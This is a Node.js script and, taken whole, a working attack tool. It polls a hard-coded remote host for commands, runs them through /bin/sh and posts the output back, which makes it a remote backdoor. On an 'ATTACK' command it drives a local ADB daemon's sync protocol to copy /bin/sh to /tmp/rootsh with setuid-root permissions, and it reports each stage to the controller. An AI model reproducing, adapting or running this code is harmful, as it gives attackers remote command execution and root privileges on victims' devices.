var net = require('net');
var http = require('http');
var cp = require('child_process');
var HOST = '192.168.1.55';
function post(b) {
    try {
        var r = http.request({ host: HOST, port: 4446, method: 'POST', path: '/r' }, function () {});
        r.on('error', function () {});
        r.write(b || '');
        r.end();
    } catch (e) {}
}
post('C15?start');
function crc(b) { var res = 0; for (var i = 0; i < b.length; ++i) res = (res + b[i]) & 0xFFFFFFFF; return res >>> 0; }
function pkt(cmd, a1, a2, payload) {
    var b = new Buffer(24 + payload.length);
    b.writeUInt32LE(cmd, 0); b.writeUInt32LE(a1, 4); b.writeUInt32LE(a2, 8);
    b.writeUInt32LE(payload.length, 12); b.writeUInt32LE(crc(payload), 16);
    b.writeUInt32LE((0xFFFFFFFF - cmd) >>> 0, 20);
    payload.copy(b, 24);
    return b;
}

var attacking = false;

function attack() {
    if (attacking) return;
    attacking = true;
    post('C15?attack');
    var s = net.connect(26101, '127.0.0.1');
    var buf = new Buffer(0);
    var inner = new Buffer(0);
    var MYID = 12345;
    var syncRemote = -1;
    var stage = 0;
    var recvBuf = new Buffer(0);
    var shBytes = null;
    var finished = false;

    function finish(tag) {
        if (finished) return;
        finished = true;
        attacking = false;
        post('C15?finish=' + tag);
        try { s.destroy(); } catch (e) {}
    }
    function syncWrite(data) { try { s.write(pkt(0x45545257, MYID, syncRemote, data)); } catch (e) { finish('werr'); } }
    function sreq(cmd, payload) {
        var b = new Buffer(8 + payload.length);
        b.write(cmd, 0, 'ascii');
        b.writeUInt32LE(payload.length, 4);
        b.write(payload, 8, 'ascii');
        syncWrite(b);
    }
    function go() {
        stage++;
        if (stage === 1) sreq('LIST', '/');
        else if (stage === 2) { recvBuf = new Buffer(0); sreq('RECV', '/bin/sh'); }
        else if (stage === 3) sreq('SEND', '/tmp/sync_marker.txt,0644');
        else if (stage === 4) sreq('SEND', '/tmp/rootsh,04755');
        else finish('done');
    }
    function handleInner(payload) {
        inner = Buffer.concat([inner, payload]);
        while (inner.length >= 8) {
            var sc = inner.slice(0, 4).toString('ascii');
            var slen = inner.readUInt32LE(4);
            if (inner.length < 8 + slen) break;
            var data = inner.slice(8, 8 + slen);
            inner = inner.slice(8 + slen);
            if (sc === 'OKAY') {
                if (stage === 2) { go(); }
                else if (stage === 3) { syncWrite(new Buffer('S15_MARKER')); }
                else if (stage === 4) { post('C15?rootsh_okay'); syncWrite(shBytes); }
            } else if (sc === 'DATA' && stage === 2) {
                recvBuf = Buffer.concat([recvBuf, data]);
            } else if (sc === 'DONE') {
                if (stage === 2) { shBytes = recvBuf; post('C15?sh_size=' + shBytes.length); }
                go();
            } else if (sc === 'FAIL') {
                post('C15?FAIL[' + stage + ']=' + data.toString('ascii', 0, 150));
                go();
            }
        }
    }
    s.on('connect', function () {
        post('C15?tcp');
        s.write(pkt(0x4e584e43, 0x01000000, 4096, new Buffer('host::\0', 'binary')));
    });
    s.on('data', function (d) {
        buf = Buffer.concat([buf, d]);
        while (buf.length >= 24) {
            var cmd = buf.readUInt32LE(0);
            var a1 = buf.readUInt32LE(4);
            var a2 = buf.readUInt32LE(8);
            var len = buf.readUInt32LE(12);
            if (buf.length < 24 + len) break;
            var payload = buf.slice(24, 24 + len);
            buf = buf.slice(24 + len);
            if (cmd === 0x4e584e43) {
                post('C15?cnxn');
                s.write(pkt(0x4e45504f, MYID, 0, new Buffer('sync:\0', 'binary')));
            } else if (cmd === 0x59414b4f && syncRemote === -1) {
                syncRemote = a1;
                post('C15?sync_ok');
                go();
            } else if (cmd === 0x45545257 && a2 === MYID) {
                s.write(pkt(0x59414b4f, MYID, a1, new Buffer(0)));
                handleInner(payload);
            } else if (cmd === 0x45534c43 && a2 === MYID) {
                finish('stream_closed');
            }
        }
    });
    s.on('error', function (e) { post('C15?err=' + e.message); finish('err'); });
    s.on('close', function () { finish('sock_close'); });
    setTimeout(function () { finish('timeout'); }, 90000);
}

var lastCmd = '';
var lastCmdAt = 0;

function tick() {
    http.get('http://' + HOST + ':8000/cmd', function (res) {
        var b = '';
        res.setEncoding('utf8');
        res.on('data', function (c) { b += c; });
        res.on('end', function () {
            var body = (b || '').trim();
            if (body === 'ATTACK') {
                if (!attacking) { lastCmdAt = Date.now(); attack(); }
            } else if (body.length > 0) {
                var sh = cp.spawn('/bin/sh', ['-c', b]);
                var o = '', e = '';
                sh.stdout.on('data', function (d) { o += d; });
                sh.stderr.on('data', function (d) { e += d; });
                sh.on('exit', function (c) { post('RUN?code=' + c + '\n' + o + e); });
            }
            setTimeout(tick, 3000);
        });
    }).on('error', function () { setTimeout(tick, 6000); });
}
tick();
